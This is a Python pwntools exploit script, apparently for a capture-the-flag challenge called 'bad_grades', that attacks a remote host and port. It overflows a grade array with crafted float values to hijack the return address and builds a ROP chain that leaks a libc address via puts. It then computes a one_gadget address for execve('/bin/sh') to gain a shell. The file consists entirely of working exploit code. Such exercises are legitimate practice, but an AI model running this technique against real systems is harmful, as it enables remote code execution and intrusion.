from pwn import *

r = remote("138.68.188.223" ,30542)
#r = process("./bad_grades_patched")
e = ELF("./bad_grades_patched")
libc = ELF("./libc.so.6")
r.sendlineafter('2. Add new.\n> ' ,'2')
r.sendlineafter('Number of grades: \x1b[0m' ,'39')
for i in range(1,34):
    r.sendline('0')
for i in range(34,36):
    r.sendline('.')
r.sendlineafter(']: ' ,'2.074587e-317')         #for tampering the saved ret address with the address of"pop rdi ;ret"
r.sendlineafter(']: ' ,'3.112396e-317')         #for "pop rdi" instruction to set rdi = got address of puts
r.sendlineafter(']: ' ,'2.0730836e-317')        #for "ret" instrunction to jump to puts@plt
r.sendlineafter(']: ' ,'2.0744156e-317')
r.recvuntil(b".00\n")
libc_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
print(hex(libc_leak))
libc_base = libc_leak - libc.sym.puts
print(hex(libc_base))
r.sendlineafter('2. Add new.\n> ' ,'2')
r.sendlineafter('Number of grades: \x1b[0m' ,'36')
for i in range(1,34):
    r.sendline('0')
for i in range(34,36):
    r.sendlineafter(']: ' ,'.')
one_gadget = libc_base + 0x4f432                #one_gadget address of execve("/bin/sh", rsp+0x40, environ)
print(hex(one_gadget))
#r.interactive()
#r.sendline(one_gadget)
r.interactive()
